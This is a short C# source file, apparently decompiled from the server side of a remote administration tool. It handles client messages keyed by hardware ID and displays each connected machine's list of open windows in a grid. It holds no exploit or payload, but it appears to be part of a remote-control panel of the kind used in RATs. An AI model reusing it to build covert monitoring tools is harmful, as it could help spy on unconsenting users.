using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerWindow
{
	public static void Read(Clients client, object[] objects)
	{
		switch ((string)objects[1])
		{
		case "Connect":
		{
			FormWindow form3 = (FormWindow)Application.OpenForms["Window:" + (string)objects[2]];
			if (form3 == null)
			{
				client.Disconnect();
				break;
			}
			form3.Invoke((MethodInvoker)delegate
			{
				form3.Text = "Window [" + (string)objects[2] + "]";
				form3.materialLabel1.Text = "Succues Connect";
				form3.client = client;
				form3.dataGridView2.Enabled = true;
			});
			client.Tag = form3;
			client.Hwid = (string)objects[2];
			break;
		}
		case "List":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormWindow form2 = (FormWindow)client.Tag;
			form2.Invoke((MethodInvoker)delegate
			{
				form2.dataGridView2.Rows.Clear();
				form2.materialLabel1.Text = "Succues list window";
				int num = 2;
				while (num < objects.Length)
				{
					DataGridViewRow dataGridViewRow = new DataGridViewRow
					{
						Cells = 
						{
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (bool)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (int)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (int)objects[num++]
							},
							(DataGridViewCell)new DataGridViewTextBoxCell
							{
								Value = (string)objects[num++]
							}
						}
					};
					form2.dataGridView2.Rows.Add(dataGridViewRow);
				}
			});
			break;
		}
		case "Error":
		{
			if (client.Tag == null)
			{
				client.Disconnect();
				break;
			}
			FormWindow form = (FormWindow)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.materialLabel1.Text = "Error: " + (string)objects[2];
			});
			break;
		}
		}
	}
}
